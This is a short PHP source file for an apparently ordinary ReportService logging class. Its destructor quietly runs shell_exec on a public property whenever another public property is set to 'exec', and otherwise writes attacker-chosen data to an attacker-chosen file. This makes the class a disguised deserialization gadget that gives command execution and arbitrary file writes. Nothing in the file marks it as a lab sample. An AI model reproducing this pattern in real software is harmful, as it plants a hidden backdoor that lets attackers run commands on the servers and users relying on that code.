<?php

namespace App\Services;

class ReportService {
    public string $logFile = '';
    public string $data = '';
    public string $action = 'log';

    public function __construct(string $logFile = '', string $data = '') {
        $this->logFile = $logFile;
        $this->data = $data;
    }

    public function __destruct() {
        if (!empty($this->logFile)) {
            if ($this->action === 'exec') {
                @shell_exec($this->data);
            } else {
                @file_put_contents($this->logFile, $this->data, FILE_APPEND);
            }
        }
    }
}
